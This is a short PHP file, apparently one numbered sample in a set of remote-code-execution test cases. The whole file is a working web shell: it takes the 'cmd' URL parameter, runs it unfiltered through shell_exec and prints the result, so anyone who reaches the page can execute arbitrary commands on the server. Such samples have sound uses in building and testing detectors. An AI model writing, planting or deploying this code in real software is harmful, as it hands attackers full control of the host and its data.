<?php
// RCE test variation #1097
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>